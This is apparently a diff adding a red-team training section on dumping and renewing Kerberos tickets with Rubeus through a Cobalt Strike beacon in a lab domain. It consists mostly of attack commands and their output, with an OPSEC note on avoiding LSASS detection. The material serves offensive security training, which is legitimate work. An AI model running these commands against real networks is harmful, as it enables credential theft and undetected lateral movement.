@@ -81,3 +81,141 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoas
 ## Extracting Tickets
 
 If an adversary gains elevated access to a computer, they can extract Kerberos tickets that are currently cached in memory.  Rubeus' `triage` command will enumerate every logon session present and their associated tickets.  If multiple logon session exist (i.e. multiple users are logged onto the same computer), TGTs and/or service tickets for those users can be extracted and re-used by the adversary.
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
+Action: Triage Kerberos Tickets (All Users)
+
+[*] Current LUID    : 0x9ff74
+
+ ------------------------------------------------------------------------------------------------------- 
+ | LUID     | UserName                   | Service                               | EndTime             |
+ ------------------------------------------------------------------------------------------------------- 
+ | 0xd42c80 | rsteel @ CONTOSO.COM       | krbtgt/CONTOSO.COM                    | 17/02/2025 19:53:40 |
+ | 0x692d8c | pchilds @ CONTOSO.COM      | krbtgt/CONTOSO.COM                    | 17/02/2025 20:07:34 |
+ | 0x692d8c | pchilds @ CONTOSO.COM      | LDAP/lon-dc-1.contoso.com/contoso.com | 17/02/2025 20:07:34 |
+ | 0x692d8c | pchilds @ CONTOSO.COM      | ldap/lon-dc-1.contoso.com             | 17/02/2025 20:07:34 |
+ | 0x9ff74  | pchilds @ CONTOSO          | lon-wkstn-1$@CONTOSO.COM              | 17/02/2025 09:47:18 |
+ | 0x8f294  | pchilds @ CONTOSO.COM      | krbtgt/CONTOSO.COM                    | 17/02/2025 19:32:11 |
+ | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | krbtgt/CONTOSO.COM                    | 17/02/2025 19:32:09 |
+ | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com             | 17/02/2025 19:32:09 |
+ | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | GC/lon-dc-1.contoso.com/contoso.com   | 17/02/2025 19:32:09 |
+ | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | ldap/lon-dc-1.contoso.com             | 17/02/2025 19:32:09 |
+ | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | ldap/lon-dc-1.contoso.com/contoso.com | 17/02/2025 19:32:09 |
+ | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | DNS/lon-dc-1.contoso.com              | 17/02/2025 19:32:09 |
+ | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | krbtgt/CONTOSO.COM                    | 17/02/2025 19:32:10 |
+ | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com             | 17/02/2025 19:32:10 |
+ | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com/contoso.com | 17/02/2025 19:32:10 |
+ | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | LON-WKSTN-1$                          | 17/02/2025 19:32:10 |
+ | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | LDAP/lon-dc-1.contoso.com             | 17/02/2025 19:32:10 |
+ | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | LDAP/lon-dc-1.contoso.com/contoso.com | 17/02/2025 19:32:10 |
+ | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | lon-wkstn-1$@CONTOSO.COM              | 17/02/2025 09:47:18 |
+ -------------------------------------------------------------------------------------------------------
+```
+
+Rubeus' `dump` command with no additional parameters will extract every single ticket.  Use the `/service` and/or `/luid` parameters to target a specific service and/or logon session.  Tickets with krbtgt as the service are TGTs, other tickets are service tickets.
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
+
+Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Target service  : krbtgt
+[*] Target LUID     : 0xd42c80
+[*] Current LUID    : 0x9ff74
+
+  UserName                 : rsteel
+  Domain                   : CONTOSO
+  LogonId                  : 0xd42c80
+  UserSID                  : S-1-5-21-3926355307-1661546229-813047887-1108
+  AuthenticationPackage    : Kerberos
+  LogonType                : Interactive
+  LogonTime                : 17/02/2025 09:53:40
+  LogonServer              : LON-DC-1
+  LogonServerDNSDomain     : CONTOSO.COM
+  UserPrincipalName        : rsteel@contoso.com
+
+    ServiceName              :  krbtgt/CONTOSO.COM
+    ServiceRealm             :  CONTOSO.COM
+    UserName                 :  rsteel (NT_PRINCIPAL)
+    UserRealm                :  CONTOSO.COM
+    StartTime                :  17/02/2025 09:53:40
+    EndTime                  :  17/02/2025 19:53:40
+    RenewTill                :  24/02/2025 09:53:40
+    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  18ERntJqjw7kxyWcumyzU0uOzbjM3spuh9bMkV4OiKI=
+    Base64EncodedTicket   :
+
+      doIFm[...snip...]DT00=
+```
+
+> You must be in a high-integrity session to triage and dump tickets from LUIDs other than your own.
+
+#### *OPSEC Considerations*
+
+The major OPSEC advantage of dumping tickets from memory is that it does not touch LSASS in the same way that dumping hashes does (e.g. with Mimikatz sekurlsa).  The ticket data are recovered using LSA APIs such as [LsaCallAuthenticationPackage](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage), rather than pulling them directly from LSASS memory.  This means we never obtain a handle to the LSASS process and therefore won't be logged via kernel callbacks.
+
+### Renewing TGTs
+Hashes are good until the user's password changes but tickets have a much more limited lifetime.  Once a TGT has expired, it can no longer be used to request service tickets.  Running Rubeus `describe` against a ticket will show you its **StartTime**, **EndTime**, and **RenewTill** fields.
+
+```powershell
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
+
+[*] Action: Describe Ticket
+
+  ServiceName              :  krbtgt/CONTOSO.COM
+  ServiceRealm             :  CONTOSO.COM
+  UserName                 :  rsteel (NT_PRINCIPAL)
+  UserRealm                :  CONTOSO.COM
+  StartTime                :  11/04/2025 16:33:17
+  EndTime                  :  12/04/2025 02:33:17
+  RenewTill                :  18/04/2025 16:33:17
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  dYvwhkU1keAEgYuEbzLYOasJypZsWqJaQOMUN5hGLXw=
+```
+
+Where:
+
+- **StartTime** is the date/time when the ticket was issued by the KDC. 
+- **EndTime** is the expiry date of this ticket.  This is 10 hours after the StartTime by default.
+- **RenewTill** is the date beyond which tickets can no longer be renewed (this won't make 100% sense just yet).  This is 7 days after the StartTime by default.
+
+TGTs issued by a KDC are only valid for a limited length of time.  When they are due to expire, Windows will transparently renew the ticket without the user having to provide their password again.  We can renew a ticket manually using Rubeus' `renew` command.
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
+
+[*] Action: Renew Ticket
+
+[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
+[*] Building TGS-REQ renewal for: 'CONTOSO.COM\rsteel'
+
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+      doIFq[...snip...]uQ09N
+```
+
+If we describe this new ticket, we'll see that the StartTime and EndTime have been changed to reflect the date/time this ticket was issued and will expire.  However, the RenewTill time is the same as the original ticket.
+
+```powershell
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
+
+[*] Action: Describe Ticket
+
+  ServiceName              :  krbtgt/CONTOSO.COM
+  ServiceRealm             :  CONTOSO.COM
+  UserName                 :  rsteel (NT_PRINCIPAL)
+  UserRealm                :  CONTOSO.COM
+  StartTime                :  11/04/2025 17:27:59
+  EndTime                  :  12/04/2025 03:27:59
+  RenewTill                :  18/04/2025 16:33:17
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  dYvwhkU1keAEgYuEbzLYOasJypZsWqJaQOMUN5hGLXw=
+```
+
+> This means that we can renew a TGT every 10 hours, up until the RenewTill date is reached.  After that, we'd have to dump a fresh TGT.
